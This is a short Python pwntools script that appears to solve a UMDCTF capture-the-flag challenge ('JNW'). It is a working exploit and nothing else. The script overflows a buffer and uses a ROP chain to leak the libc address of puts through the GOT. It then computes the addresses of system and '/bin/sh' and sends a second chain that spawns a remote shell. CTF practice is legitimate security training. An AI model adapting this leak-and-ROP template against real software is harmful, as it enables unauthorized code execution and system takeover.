from pwn import *


p = remote("chals5.umdctf.io", 7004)
elf = ELF("./JNW")
pop_rdi_ret = 0x00000000004012c3
pop_rsi_pop_r15_ret = 0x00000000004012c1

payload = b"A"*0x48
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x40120b)

p.sendlineafter("go",payload)
leak = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
print("leak : " + hex(leak))
system = leak - 0x31550
binsh = leak + 0x13337a

payload = b"A"*0x48
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(system)
payload += p64(system)
p.sendlineafter("go",payload)



p.interactive()